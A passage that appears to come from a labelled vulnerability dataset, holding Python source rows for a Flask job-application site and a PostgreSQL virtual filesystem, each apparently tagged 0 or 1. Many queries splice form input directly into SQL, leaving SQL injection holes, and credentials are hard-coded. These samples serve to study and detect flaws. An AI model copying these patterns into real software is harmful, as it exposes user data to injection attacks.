    if request.method == 'POST':
        jid = request.form.get('jid')
        vtype = request.form.get('vtype')
        query = '''
        delete from Application
        where uemail=\'''' + session[""user_id""] + '\' and jid=' + jid + ' and vtype=\'' + vtype + '\'' 
        g.conn.execute(text(query))
        return render_template(""cancel_apply.html"", jid = jid, vtype = vtype)
    return render_template(""cancel_apply.html"")

# some statistic info

# insert job (TBD)

# delete job (TBD)

# update job (TBD)

if __name__ == '__main__':
    import click

    @click.command()
    @click.option('--debug', is_flag=True)
    @click.option('--threaded', is_flag=True)
    @click.argument('HOST', default='0.0.0.0')
    @click.argument('PORT', default=8111, type=int)
    def run(debug, threaded, host, port):
        """"""
        This function handles command line parameters.
        Run the server using

            python server.py

        Show the help text using

            python server.py --help

        """"""
        HOST, PORT = host, port
        print ""running on %s:%d"" % (HOST, PORT)
        app.run(host=HOST, port=PORT, debug=debug, threaded=threaded)

    run()/n/n/nWeb-app/User.py/n/nfrom flask_login import UserMixin
from flask import g


class User(UserMixin):
    def __init__(self, email='', password='', name=''):
        UserMixin.__init__(self)
        self.email = email
        self.name = name
        self.password = password
        self.valid = False
        self.id = ''  # Extra id field for Flask-login requirement

    # @This Function verify whether a user is recorded
    def user_verify(self):
        eid = self.email
        code = self.password
        if eid.strip() == '':
            return
        if code.strip() == '':
            return
        query = 'select * from usr where email like %s'
        cursor = g.conn.execute(query, (eid, ))
        for row in cursor:
            key = str(row.password)
            if key.strip() == code.strip():
                self.name = str(row.name)
                self.email = eid
                self.id = eid
                self.valid = True
            break

    # @This function insert a new user into database
    def insert_new_user(self):
        try:
            query = '''
            insert into usr (email,name,password)
            values (%s,%s,%s)'''
            if self.email.strip() == '' or self.name.strip() == '' or self.name.strip() =='':
                return
            g.conn.execute(query, (self.email, self.name, self.password))
            self.valid = True
            if self.valid:
                self.id = self.email
        except:
            print 'invalid user'

    '''
    Rewrite def in order to get things work
    '''
    def is_authenticated(self):
        if self.valid:
            return True
        return False

    def is_active(self):
        return True

    def get_id(self):
        return self.id
/n/n/n",0
197,197,fe04bedc72e62fd4c4ee046a9af29fd81e9b3340,"/Web-app/Server.py/n/nimport os
from sqlalchemy import *
from flask import Flask, request, render_template, g, redirect, Response, flash, url_for, session
from flask_login import LoginManager, login_user, login_required, logout_user, current_user
from Database import engine
from User import User

# set app and login system
tmpl_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')
app = Flask(__name__, template_folder=tmpl_dir)
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = ""login""
app.secret_key = 'I love database'


# Get current user's information
@login_manager.user_loader
def load_user(s_id):
    email = str(s_id)
    query = '''select * from usr where email like\'''' + email + '\''
    cursor = g.conn.execute(query)
    user = User()
    for row in cursor:
        user.name = str(row.name)
        user.email = str(row.email)
        break
    return user


# Prepare the page
@app.before_request
def before_request():
  try:
    g.conn = engine.connect()
  except:
    print ""uh oh, problem connecting to database""
    import traceback; traceback.print_exc()
    g.conn = None


@app.teardown_request
def teardown_request(exception):
  try:
    g.conn.close()
  except Exception:
    pass


# @The function for user login
@app.route(""/login"", methods=[""GET"", ""POST""])
def login():
    error = None
    page = 'login'
    if request.method == 'POST':

        # Obtain input value and pass to User object
        email = str(request.form['email']).strip()
        password = str(request.form['password']).strip()
        user = User(email, password)
        user.user_verify()

        if not user.valid:
            error = 'Invalid login information'
        else:
            session['logged_in'] = True
            login_user(user)
            print current_user.id
            flash('You were logged in')
            g.user = current_user.id
            return redirect(url_for('user_home_page'))

    return render_template('login.html', error=error, page=page)


# @This function is for user sign-up
@app.route(""/signup"", methods=[""GET"", ""POST""])
def signup():
    error = None
    page = 'signup'
    if request.method == 'POST':
        name = str(request.form['username']).strip()
        password = str(request.form['password']).strip()
        email = str(request.form['email']).strip()
        print name, password, email
        newuser = User(email, password, name)
        newuser.insert_new_user()
        if not newuser.valid:
            error = 'Invalid user information, please choose another one'
        else:
            session['logged_in'] = True
            login_user(newuser)
            flash('Thanks for signing up, you are now logged in')
            return redirect(url_for('user_home_page'))
    return render_template('signup.html', error=error, page=page)


@app.route(""/logout"")
@login_required
def logout():
    session.pop('logged_in', None)
    logout_user()
    return redirect(url_for('login'))


'''
This part is the User Homepage, add app functions here
Modify user_home_page.html as well
'''


@app.route(""/"", methods=[""GET"", ""POST""])
@login_required
def user_home_page():
    message = ""Welcome back! "" + current_user.name
    if request.method == 'GET':
        query = '''
        select tmp.jid as id, tmp.name as name, tmp.type as type,
               tmp.sal_from as sfrom, tmp.sal_to as sto, 
               tmp.sal_freq as sfreq, tmp.posting_time as ptime
        from (vacancy v natural join job j) as tmp, application ap
        where ap.uemail = \'''' + session[""user_id""] + '\' and ap.jid = tmp.jid and ap.vtype = tmp.type'
        cursor = g.conn.execute(text(query))
        data = cursor.fetchall()
        return render_template(""user_home_page.html"", message = message, data = data)
    return render_template(""user_home_page.html"", message = message)


# @Search vacancy with keyword
@app.route(""/search"", methods=[""GET"", ""POST""])
@login_required
def search_vacancy():
    if request.method == 'POST':
        key = str(request.form['keyword']).strip()
        if not key:
            return render_template(""search.html"")
        attr = request.form.get('attr')
        ptf = str(request.form['pt_from']).strip()  # posting time from
        ptt = str(request.form['pt_to']).strip()  # posting time from
        order = request.form.get('order')
        order_attr = request.form.get('order_attr')
        limit = str(request.form['limit']).strip()
        query = '''
        select j.jid as id, j.name as name, v.type as type,
               v.sal_from as sfrom, v.sal_to as sto, 
               v.sal_freq as sfreq ,v.posting_time as ptime
        from vacancy as v inner join job as j on v.jid = j.jid
        '''
        if ptf and ptt:
            query += 'where v.posting_time>=\'' + ptf + '\' and v.posting_time<=\'' + ptt + '\' and '
        elif ptf and not ptt:
            query += 'where v.posting_time>=\'' + ptf + '\' and '
        elif not ptf and ptt:
            query += 'where v.posting_time<=\'' + ptt + '\' and '
        else:
            query += 'where '
        
        if attr == 'name':
            query += 'lower(j.name) like lower(\'%' + key + '%\') '    # use lower() to ignore case 
        elif attr == 'salary':
            query += 'v.sal_from <= ' + key + ' and v.sal_to >=' + key + ' '
        elif attr == 'skill':
            query += 'j.pre_skl like \'%' + key + '%\' or j.job_des like \'%''' + key + '%\' '
        
        if order_attr == 'pt':
            query += 'order by v.posting_time ' + order
        elif order_attr == 'id':
            query += 'order by j.jid ' + order
        elif order_attr == 'name':
            query += 'order by j.name ' + order
        elif order_attr == 'lows':
            query += 'order by v.sal_from ' + order
        elif order_attr == 'highs':
            query += 'order by v.sal_to ' + order
        
        if limit and limit != 'all':
            query += ' limit ' + limit
        cursor = g.conn.execute(text(query))  # !Very important here, must convert type text()
        job = []
        for row in cursor:
            job.append(row)
        data = job
        return render_template(""search.html"", data=data, keyword = key)
    return render_template(""search.html"")

# detailed info of a vacancy
@app.route(""/detailed_info"", methods=[""GET"", ""POST""])
@login_required
def detailed_info():
    if request.method == 'POST':
        jid = request.form.get('jid')
        vtype = request.form.get('vtype')
        query = '''
        select *
        from vacancy v natural join job j
        where j.jid=''' + jid + ' and v.type=\'' + vtype +'\''
        cursor = g.conn.execute(text(query))
        data = cursor.fetchall()
        col_names = ['JID', 'Type', '# Positions', 'Salary from', 'Salary to', 'Salary Frequency', 'Post Until', 'Posting Time', 'Updated Time', 'Unit', 'Agency', 'Level', 'Job Name', 'Preferred Skills', 'Job Description', 'Location', 'Hour/Shift', 'Title code', 'Civil Service TiTle']  # column header
        return render_template(""detailed_info.html"", zippedlist = zip(col_names, data[0]), jid = jid, vtype = vtype) # zip to help us iterate two lists parallelly
    return render_template(""detailed_info.html"")

# apply for the vacancy
@app.route(""/apply"", methods=[""GET"", ""POST""])
@login_required
def apply():
    if request.method == 'POST':
        jid = request.form.get('jid')
        vtype = request.form.get('vtype')
        query = '''
        insert into Application
        values (\'''' + session[""user_id""] + '\', ' + jid + ', \'' + vtype + '\')'  # Zihan: I tried to use current_user.id here and it returned nothing. So I use session[""user_id""] instead.
        g.conn.execute(text(query))
        return render_template(""apply.html"", jid = jid, vtype = vtype)
    return render_template(""apply.html"")

# cancel application for the vacancy
@app.route(""/canel_apply"", methods=[""GET"", ""POST""])
@login_required
def cancel_apply():
    if request.method == 'POST':
        jid = request.form.get('jid')
        vtype = request.form.get('vtype')
        query = '''
        delete from Application
        where uemail=\'''' + session[""user_id""] + '\' and jid=' + jid + ' and vtype=\'' + vtype + '\'' 
        g.conn.execute(text(query))
        return render_template(""cancel_apply.html"", jid = jid, vtype = vtype)
    return render_template(""cancel_apply.html"")

# some statistic info

# insert job (TBD)

# delete job (TBD)

# update job (TBD)

if __name__ == '__main__':
    import click

    @click.command()
    @click.option('--debug', is_flag=True)
    @click.option('--threaded', is_flag=True)
    @click.argument('HOST', default='0.0.0.0')
    @click.argument('PORT', default=8111, type=int)
    def run(debug, threaded, host, port):
        """"""
        This function handles command line parameters.
        Run the server using

            python server.py

        Show the help text using

            python server.py --help

        """"""
        HOST, PORT = host, port
        print ""running on %s:%d"" % (HOST, PORT)
        app.run(host=HOST, port=PORT, debug=debug, threaded=threaded)

    run()/n/n/n/Web-app/User.py/n/nfrom flask_login import UserMixin
from flask import g


class User(UserMixin):
    def __init__(self, email='', password='', name=''):
        UserMixin.__init__(self)
        self.email = email
        self.name = name
        self.password = password
        self.valid = False
        self.id = ''  # Extra id field for Flask-login requirement

    # @This Function verify whether a user is recorded
    def user_verify(self):
        eid = self.email
        code = self.password
        if eid.strip() == '':
            return
        if code.strip() == '':
            return
        query = '''select * from usr where email like\''''+eid+'\''
        cursor = g.conn.execute(query)
        for row in cursor:
            key = str(row.password)
            if key.strip() == code.strip():
                self.name = str(row.name)
                self.email = eid
                self.id = eid
                self.valid = True
            break

    # @This function insert a new user into database
    def insert_new_user(self):
        try:
            query = '''
            insert into usr (email,name,password)
            values (%s,%s,%s)'''
            if self.email.strip() == '' or self.name.strip() == '' or self.name.strip() =='':
                return
            g.conn.execute(query, (self.email, self.name, self.password))
            self.valid = True
            if self.valid:
                self.id = self.email
        except:
            print 'invalid user'

    '''
    Rewrite def in order to get things work
    '''
    def is_authenticated(self):
        if self.valid:
            return True
        return False

    def is_active(self):
        return True

    def get_id(self):
        return self.id
/n/n/n",1
16,16,fa76c130ed80b9f5636cab41e88054536205c376,"bzs/const.py/n/n
universal_options_list = {
    'author': 'Geoffrey, Tang.',
    'copyright': 'Copyright 2016, Geoffrey Tang. All lefts reversed.',
    'db-name': 'testdb',
    'db-user': 'postgres',
    'db-password': '123456',
    'db-host-addr': '127.0.0.1',
    'db-host-port': '8079',
    'license': 'GNU GPL v3',
    'server-name': 'Apache/2.4.1 (Linux 2.6.32)',
    'time-format': '%a %Y/%m/%d, %H:%M:%S',
    'time-zone': 'Asia/Shanghai',
    'version': 'indev'
}

def get_const(_):
    return universal_options_list[_] if _ in universal_options_list else None
/n/n/nbzs/db.py/n/n
import binascii
import copy
import datetime
import hashlib
import psycopg2
import pytz
import time
import uuid

from bzs import const

def get_current_time():
    """"""Gets the current time, in float since epoch.""""""
    # return datetime.datetime.now(tz=pytz.timezone(const.get_const('time-zone')))
    return float(time.time())

def get_new_uuid(uuid_, uuid_list=None):
    """"""Creates a new UUID that is not in 'uuid_list' if given.""""""
    if not uuid_:
        uuid_ = uuid.uuid4().hex
        if type(uuid_list) in [set, dict]:
            while uuid_ in uuid_list:
                uuid_ = uuid.uuid4().hex
    return uuid_

################################################################################

class DatabaseType:
    def __init__(self):
        self.connect_params = dict(
            database=const.get_const('db-name'),
            user=const.get_const('db-user'),
            password=const.get_const('db-password'),
            host=const.get_const('db-host-addr'),
            port=const.get_const('db-host-port')
        )
        self._db = psycopg2.connect(**self.connect_params)
        self._cur = None
        return

    def execute(self, command, **args):
        self._cur = self._db.cursor()
        try:
            self._cur.execute(command, **args)
            final_arr = self._cur.fetchall()
        except psycopg2.ProgrammingError:
            # We'll take this as granted... though risky.
            final_arr = None
        self._db.commit()
        self._cur.close()
        return final_arr

    def init_db(self):
        # Purge database of obsolete tables
        self.execute(""""""
            DROP TABLE core;
        """""")
        self.execute(""""""
            DROP TABLE users;
        """""")
        self.execute(""""""
            DROP TABLE file_system;
        """""")
        self.execute(""""""
            DROP TABLE file_storage;
        """""")
        # Creating new tables in order to function
        self.execute(""""""
            CREATE TABLE core (
                index   TEXT,
                data    BYTEA
            );
            CREATE TABLE users (
                handle          TEXT,
                password        TEXT,
                usergroups      TEXT,
                ip_address      TEXT[],
                events          TEXT[],
                usr_name        TEXT,
                usr_description TEXT,
                usr_email       TEXT,
                usr_followers   TEXT[],
                usr_friends     TEXT[]
            );
            CREATE TABLE file_system(
                uuid        TEXT,
                file_name   TEXT,
                owner       TEXT,
                upload_time DOUBLE PRECISION,
                sub_folders TEXT[],
                sub_files   TEXT[][]
            );
            CREATE TABLE file_storage (
                uuid    TEXT,
                size    BIGINT,
                count   BIGINT,
                hash    TEXT,
                content BYTEA
            );
        """""")
        return
    pass

Database = DatabaseType()

################################################################################

class FileStorageType:
    st_uuid_idx = dict()
    st_hash_idx = dict()
    # Database entry
    st_db = Database
    # Hashing algorithm, could be md5, sha1, sha224, sha256, sha384, sha512
    # sha384 and sha512 are not recommended due to slow speeds on 32-bit computers
    hash_algo = hashlib.sha256

    class UniqueFile:
        def __init__(self, uuid_=None, size=0, count=1, hash_=None, master=None):
            self.master = master
            self.uuid = get_new_uuid(uuid_, self.master.st_uuid_idx)
            self.master.st_uuid_idx[self.uuid] = self
            self.size = size
            self.count = count # The number of references
            self.hash = hash_ # Either way... must specify this!
            self.master.st_hash_idx[self.hash] = self
            # Will not contain content, would be indexed in SQL.
            return
        pass

    def __init__(self, db=Database):
        return self.load_sql(db)

    def load_sql(self, db=Database):
        """"""Loads index of all stored UniqueFiles in database.""""""
        self.st_db = db
        for item in self.st_db.execute(""SELECT uuid, size, count, hash FROM file_storage;""):
            s_uuid, s_size, s_count, s_hash = item
            s_fl = self.UniqueFile(s_uuid, s_size, s_count, s_hash, self)
            # Inject into indexer
            self.st_uuid_idx[s_uuid] = s_fl
            self.st_hash_idx[s_hash] = s_fl
        return

    def new_unique_file(self, content):
        """"""Creates a UniqueFile, and returns its UUID in string.""""""
        n_uuid = get_new_uuid(None, self.st_uuid_idx)
        n_size = len(content)
        n_count = 1
        n_hash = self.hash_algo(content).hexdigest()
        u_fl = self.UniqueFile(n_uuid, n_size, n_count, n_hash, master=self)
        # Done indexing, now proceeding to process content into SQL
        content = binascii.hexlify(content).decode('ascii')
        self.st_db.execute(""INSERT INTO file_storage (uuid, size, count, hash, content) VALUES ('%s', %d, %d, '%s', E'\\x%s');"" % (n_uuid, n_size, n_count, n_hash, content))
        # Injecting file into main indexer
        self.st_uuid_idx[n_uuid] = u_fl
        self.st_hash_idx[n_hash] = u_fl
        return n_uuid

    def get_content(self, uuid_):
        try:
            u_fl = self.st_uuid_idx[uuid_]
        except Exception:
            return b''
        # Got file handle, now querying file data
        content = self.st_db.execute(""SELECT content FROM file_storage WHERE uuid = '%s';"" % uuid_)
        print(content)
        return content
    pass

FileStorage = FileStorageType()

################################################################################

class FilesystemType:
    """"""This is a virtual filesystem based on a relational PostgreSQL database.
    We might call it a SQLFS. Its tree-topological structure enables it to index
    files and find siblings quickly. Yet without the B-Tree optimization it would
    not be easy to maintain a high performance.
    """"""
    fs_uuid_idx = dict()
    fs_root = None
    fs_db = None

    class fsNode:
        """"""This is a virtual node on a virtual filesystem SQLFS. The virtual node contains
        the following data:

            uuid        - The unique identifier: if node is a directory, then this uuid
                          would be the identifier pointing to the directory; if node is
                          a file, this identifier would be pointing to the UUID among
                          the actual files instead of the filesystem.
            is_dir      - Whether is a directory or not
            filename    - The actual file / directory name given by the user
            upload_time - The time uploaded / copied / moved to server
            f_uuid      - If a file them this indicates its FileStorage UUID.

        Other data designed to maintain the structure of the node includes:

            master        - The filesystem itself.
            sub_folder    - Removed after filesystem init, temporary use only.
            sub_files     - Removed after filesystem init, temporary use only.
            sub_items     - Set of children.
            sub_names_idx - Contains same data as sub_items, but indexed by name.

        Do process with caution, and use exported methods only.
        """"""

        def __init__(self, is_dir, file_name, owner, uuid_=None, upload_time=None, sub_folders=set(), sub_files=set(), f_uuid=None, master=None):
            # The filesystem / master of the node
            self.master = master
            # Assigning data
            self.is_dir = is_dir
            self.file_name = file_name
            self.owner = owner
            # Generate Universally Unique Identifier
            self.uuid = get_new_uuid(uuid_, master.fs_uuid_idx)
            master.fs_uuid_idx[self.uuid] = self
            # Get upload time
            self.upload_time = upload_time or get_current_time()
            if not self.is_dir:
                self.sub_folders = set()
                self.sub_files = set()
                self.f_uuid = f_uuid
            else:
                # Folder initialization needs to be accounted after init as whole by the main caller
                self.sub_folders = sub_folders # Temporary
                self.sub_files = sub_files # Temporary
            # This is a traversal thing...
            self.parent = None
            self.sub_items = set()
            self.sub_names_idx = dict()
            return
        pass

    def __init__(self, db=Database):
        return self.load_sqlfs(db)

    def load_sqlfs(self, db=Database):
        self.fs_db = db
        for item in self.fs_db.execute(""SELECT uuid, file_name, owner, upload_time, sub_folders, sub_files FROM file_system""):
            # Splitting tuple into parts
            uuid_, file_name, owner, upload_time, sub_folders, sub_files = item
            # Getting sub files which are expensive stored separately
            n_sub_files = set()
            for fil_idx in sub_files:
                # This is where the order goes, BEAWARE
                s_uuid = fil_idx[0]
                s_file_name = fil_idx[1]
                s_owner = fil_idx[2]
                try:
                    s_upload_time = float(fil_idx[3])
                except:
                    s_upload_time = get_current_time()
                s_f_uuid = fil_idx[4]
                # Pushing...
                s_file = self.fsNode(False, s_file_name, s_owner, s_uuid, s_upload_time, f_uuid=s_f_uuid, master=self)
                n_sub_files.add(s_file)
                self.fs_uuid_idx[s_uuid] = s_file
            # Getting sub folders as a set but not templating them
            n_sub_folders = set() # Since reference is passed, should not manipulate this further
            for fol_idx in sub_folders:
                n_sub_folders.add(fol_idx)
            fold_elem = self.fsNode(True, file_name, owner, uuid_, upload_time, n_sub_folders, n_sub_files, master=self)
            self.fs_uuid_idx[uuid_] = fold_elem
        # Done importing from SQL database, now attempting to refurbish connexions
        for uuid_ in self.fs_uuid_idx:
            item = self.fs_uuid_idx[uuid_]
            if not item.is_dir:
                continue
            # Asserted that it was a folder.
            for n_sub in item.sub_files:
                item.sub_items.add(n_sub)
                item.sub_names_idx[n_sub.file_name] = n_sub
            for n_sub_uuid in item.sub_folders:
                try:
                    n_sub = self.fs_uuid_idx[n_sub_uuid]
                    item.sub_items.add(n_sub)
                    item.sub_names_idx[n_sub.file_name] = n_sub
                except Exception:
                    pass
            del item.sub_files
            del item.sub_folders
        # Fixing parental occlusions
        def iterate_fsnode(node):
            for item in node.sub_items:
                if item.parent:
                    continue
                # Never iterated before
                item.parent = node
                iterate_fsnode(item)
            return
        for uuid_ in self.fs_uuid_idx: # This would fix all nodes...
            item = self.fs_uuid_idx[uuid_]
            iterate_fsnode(item)
        # Finding root and finishing parent connexions
        for uuid_ in self.fs_uuid_idx: # Takes the first element that ever occured to me
            item = self.fs_uuid_idx[uuid_]
            while item.parent:
                item = item.parent
            self.fs_root = item
            break
        else:
            self.make_root()
        # Traversing root for filename indexing
        def iterate_node_fn(node):
            for item in node.sub_items:
                node.sub_names_idx[item.file_name]
        # All done, finished initialization
        return

    def make_root(self):
        item = self.fsNode(True, '', 'System', master=self)
        del item.sub_files
        del item.sub_folders
        item.sub_items = set()
        item.parent = None
        # Done generation, inserting.
        self.fs_root = item
        self.fs_uuid_idx[item.uuid] = item
        # Inserting to SQL.
        self.fs_db.execute(""INSERT INTO file_system (uuid, file_name, owner, upload_time, sub_folders, sub_files) VALUES ('%s', '%s', '%s', %f, '{}', '{}');"" % (item.uuid, item.file_name, item.owner, item.upload_time))
        return

    def locate(self, path, parent=None):
        """"""Locate the fsNode() of the location 'path'. If 'parent' is given and
        as it should be a fsNode(), the function look to the nodes directly
        under this, non-recursively.""""""
        # On the case it is a referring location, path should be str.
        if parent:
            try:
                item = parent.sub_names_idx[path]
            except Exception:
                return None
            return item
        # And it is not such a location.
        # We assert that path should be list().
        if type(path) == str:
            path = path.split('/')
            while '' in path:
                path.remove('')
        # Now got array, traversing...
        item = self.fs_root
        while path:
            try:
                item = item.sub_names_idx[path[0]]
            except Exception:
                return None # This object does not exist.
            path = path[1:]
        return item

    def _sqlify_fsnode(self, item):
        n_uuid = item.uuid
        n_file_name = item.file_name
        n_owner = item.owner
        n_upload_time = item.upload_time
        n_sub_folders = list()
        n_sub_files = list()
        for i_sub in item.sub_items:
            if i_sub.is_dir:
                n_sub_folders.append(""\""%s\"""" % i_sub.uuid)
            else:
                s_attr = ""{%s, %s, %s, %s, %s}"" % (
                    ""\""%s\"""" % i_sub.uuid,
                    ""\""%s\"""" % i_sub.file_name,
                    ""\""%s\"""" % i_sub.owner,
                    ""\""%f\"""" % i_sub.upload_time,
                    ""\""%s\"""" % i_sub.f_uuid
                )
                n_sub_files.append(s_attr)
        # Formatting string
        n_sub_folders_str = ""'{"" + "", "".join(i for i in n_sub_folders) + ""}'""
        n_sub_files_str = ""'{"" + "", "".join(i for i in n_sub_files) + ""}'""
        return (n_uuid, n_file_name, n_owner, n_upload_time, n_sub_folders_str, n_sub_files_str)

    def _update_in_db(self, item):
        # This applies to items in the
        # We assert that item should be Node.
        if type(item) == str:
            item = self.locate(item)
        if not item:
            return False
        # Giving a few but crucial assertions...
        if not item.is_dir:
            item = item.parent
            if not item.is_dir:
                return False # I should raise, by a matter of fact
        # Collecting data
        n_uuid, n_file_name, n_owner, n_upload_time, n_sub_folders_str, n_sub_files_str = self._sqlify_fsnode(item)
        # Uploading / committing data
        command = ""UPDATE file_system SET file_name = '%s', owner = '%s', upload_time = %f, sub_folders = %s, sub_files = %s WHERE uuid = '%s';"" % (n_file_name, n_owner, n_upload_time, n_sub_folders_str, n_sub_files_str, n_uuid)
        self.fs_db.execute(command)
        return True

    def _insert_in_db(self, item):
        """"""Create filesystem record of directory 'item' inside database.""""""
        if not item.is_dir:
            return False # Must be directory...
        n_uuid, n_file_name, n_owner, n_upload_time, n_sub_folders_str, n_sub_files_str = self._sqlify_fsnode(item)
        # Uploading / committing data
        self.fs_db.execute(""INSERT INTO file_system (uuid, file_name, owner, upload_time, sub_folders, sub_files) VALUES ('%s', '%s', '%s', %f, %s, %s);"" % (n_uuid, n_file_name, n_owner, n_upload_time, n_sub_folders_str, n_sub_files_str))
        return

    def get_content(self, item):
        """"""Gets binary content of the object (must be file) and returns the actual
        content in bytes.""""""
        if type(item) == str:
            item = self.locate(item)
        if not item:
            return b''
        if item.is_dir:
            return b''
        return FileStorage.get_content(item.f_uuid)

    def _remove_recursive(self, item):
        """"""Removes content of a single object and recursively call all its
        children for recursive removal.""""""
        # We assert item is fsNode().
        # Remove recursively.
        for i_sub in item.sub_items:
            self._remove_recursive(i_sub)
        # Delete itself from filesystem.
        del self.fs_uuid_idx[item.uuid]
        # Delete itself from SQL database.
        self.fs_db.execute(""DELETE FROM file_system WHERE uuid = '%s';"" % item.uuid)
        return

    def remove(self, path):
        """"""Removes (recursively) all content of the folder / file itself and
        all its subdirectories.""""""
        if type(path) == str:
            path = self.locate(path)
            if not path:
                return False
        # Done assertion, path is now fsNode().
        par = path.parent
        self._remove_recursive(path)
        if par:
            par.sub_items.remove(path)
            del par.sub_names_idx[path.file_name]
            self._update_in_db(par)
        return True

    def _copy_recursive(self, item, target_par, new_owner):
        """"""Copies content of a single object and recursively call all its
        children for recursive copy, targeted as a child under target_par.""""""
        # We assert item, target_par are all fsNode().
        target_node = target_par.sub_names_idx[item.file_name]
        for i_sub in item.sub_items:
            i_sub.parent = item
            item.sub_names_idx[i_sub.file_name] = i_sub
            self._copy_recursive(i_sub, target_node, new_owner)
        # Insert into SQL database
        item.uuid = get_new_uuid(None, self.fs_uuid_idx)
        self.fs_uuid_idx[item.uuid] = item
        item.upload_time = get_current_time()
        if new_owner:
            item.owner = new_owner # Assignment
        if item.is_dir:
            self._insert_in_db(item)
        return

    def copy(self, source, target_parent, new_owner=None):
        """"""Copies content of 'source' (recursively) and hang the target object
        that was copied under the node 'target_parent'. If rename required please call
        the related functions separatedly.""""""
        if type(source) == str:
            source = self.locate(source)
        if type(target_parent) == str:
            target_parent = self.locate(target_parent)
        if not source or not target_parent:
            return False
        # Done assertion, now proceed with deep copy
        target = copy.deepcopy(source)
        target.parent = target_parent
        target_parent.sub_items.add(target)
        target_parent.sub_names_idx[target.file_name] = target
        self._copy_recursive(target, target_parent, new_owner)
        # Update target_parent data and return
        self._update_in_db(target_parent)
        return True

    def move(self, source, target_parent):
        if type(source) == str:
            source = self.locate(source)
        if type(target_parent) == str:
            target_parent = self.locate(target_parent)
        if not source or not target_parent:
            return False
        # Moving an re-assigning tree structures
        par = source.parent
        par.sub_items.remove(source)
        del par.sub_names_idx[source.file_name]
        source.parent = target_parent
        target_parent.sub_items.add(source)
        target_parent.sub_names_idx[source.file_name] = source
        # Updating SQL database.
        self._update_in_db(par)
        self._update_in_db(target_parent)
        return

    def rename(self, item, file_name):
        """"""Renames object 'item' into file_name.""""""
        if type(item) == str:
            item = self.locate(item)
            if not item:
                return False
        if item.parent:
            del item.parent.sub_names_idx[item.file_name]
            item.file_name = file_name
            item.parent.sub_names_idx[item.file_name] = item
        if item.is_dir:
            self._update_in_db(item)
        else:
            self._update_in_db(item.parent)
        return True

    def chown(self, item, owner):
        """"""Assign owner of 'item' to new owner, recursively.""""""
        if type(item) == str:
            item = self.locate(item)
            if not item:
                return False
        def _chown_recursive(item_, owner_):
            for sub_ in item_.sub_items:
                _chown_recursive(sub_, owner_)
            item_.owner = owner_
            if item_.is_dir:
                self._update_in_db(item_)
            return
        _chown_recursive(item, owner)
        if not item.is_dir:
            self._update_in_db(item.parent)
        return True

    def mkfile(self, path_parent, file_name, owner, content):
        """"""Inject object into filesystem, while passing in content. The content
        itself would be indexed in FileStorage.""""""
        if type(path_parent) == str:
            path_parent = self.locate(path_parent)
            if not path_parent:
                return False
        n_uuid = FileStorage.new_unique_file(content)
        n_fl = self.fsNode(False, file_name, owner, f_uuid=n_uuid, master=self)
        # Updating tree connexions
        n_fl.parent = path_parent
        path_parent.sub_items.add(n_fl)
        path_parent.sub_names_idx[file_name] = n_fl
        self._update_in_db(path_parent)
        # Indexing and return
        self.fs_uuid_idx[n_fl.uuid] = n_fl
        return True

    def mkdir(self, path_parent, file_name, owner):
        """"""Inject folder into filesystem.""""""
        if type(path_parent) == str:
            path_parent = self.locate(path_parent)
            if not path_parent:
                return False
        n_fl = self.fsNode(True, file_name, owner, master=self)
        # Updating tree connexions
        n_fl.parent = path_parent
        path_parent.sub_items.add(n_fl)
        path_parent.sub_names_idx[file_name] = n_fl
        self._update_in_db(path_parent)
        self._insert_in_db(n_fl)
        # Indexing and return
        self.fs_uuid_idx[n_fl.uuid] = n_fl
        return True

    def listdir(self, path):
        """"""Creates a list of files in the directory 'path'. Attributes of the returned
        result contains:

            file-name   - File name
            file-size   - File size
            is-dir      - Whether is directory
            owner       - The handle of the owner
            upload-time - Time uploaded, in float since epoch.

        The result should always be a list, and please index it with your own
        habits or modify the code.""""""
        if type(path) == str:
            path = self.locate(path)
            if not path:
                return []
        # List directory, given the list(dict()) result...
        dirs = list()
        for item in path.sub_items:
            attrib = dict()
            # try:
            attrib['file-name'] = item.file_name
            attrib['file-size'] = 0 if item.is_dir else FileStorage.st_uuid_idx[item.f_uuid].size
            attrib['is-dir'] = item.is_dir
            attrib['owner'] = item.owner
            attrib['upload-time'] = item.upload_time
            # except:
            #     continue
            dirs.append(attrib)
        # Give the results to downstream
        return dirs

    def shell(self):
        """"""Interactive shell for manipulating SQLFS. May be integrated into other
        utilites in the (far) futuure. Possible commands are:

            ls             - List content of current directory.
            cat name       - View binary content of the object 'name'.
            cd             - Change CWD into the given directory, must be relative.
                             or use '..' to go to parent directory.
            chown src usr  - Change ownership (recursively) of object 'src' to 'usr'.
            rename src nam - Rename file / folder 'src' to 'nam'.
            mkdir name     - Make directory of 'name' under this directory.
            mkfile name    - Make empty file of 'name' under this directory.
            rm name        - Remove (recursively) object of 'name' under this directory.
            cp src dest    - Copy object 'src' to under 'dest (actual)' as destination.
            mv src dest    - Move object 'src' to under 'dest (actual)' as destination.
            q              - Exit shell.

        Would be done in a infinite loop. Use 'q' to leave.""""""
        cwd = self.fs_root
        cuser = 'system'
        cwd_list = ['']
        while True:
            cwd_fl = ''.join((i + '/') for i in cwd_list)
            print('root@postgres %s$ ' % cwd_fl, end='')
            cmd_input = input()
            cmd = cmd_input.split(' ')
            op = cmd[0]
            if op == 'ls':
                res = self.listdir(cwd)
                # Prettify the result
                print('Owner       Upload Time         Size            Filename            ')
                print('--------------------------------------------------------------------')
                for item in res:
                    print('%s%s%s%s' % (item['owner'].ljust(12), str(int(item['upload-time'])).ljust(20), str(item['file-size'] if not item['is-dir'] else '').ljust(16), item['file-name']))
                print('Total: %d' % len(res))
                print('')
            elif op == 'cat':
                dest = self.locate(cmd[1], parent=cwd)
                print(self.get_content(dest))
            elif op == 'cd':
                if cmd[1] == '..':
                    cwd_dest = cwd.parent
                    if cwd_dest:
                        cwd = cwd_dest
                        cwd_list = cwd_list[:-1]
                else:
                    cwd_dest = cwd.sub_names_idx[cmd[1]]
                    if cwd_dest:
                        cwd = cwd_dest
                        cwd_list.append(cmd[1])
            elif op == 'chown':
                dest = self.locate(cmd[1], parent=cwd)
                self.chown(dest, cmd[2])
            elif op == 'rename':
                dest = self.locate(cmd[1], parent=cwd)
                self.rename(dest, cmd[2])
            elif op == 'mkdir':
                self.mkdir(cwd, cmd[1], cuser)
            elif op == 'mkfile':
                self.mkfile(cwd, cmd[1], cuser, b'')
            elif op == 'rm':
                self.remove(self.locate(cmd[1], parent=cwd))
            elif op == 'cp':
                src = self.locate(cmd[1], parent=cwd)
                self.copy(src, cmd[2])
            elif op == 'mv':
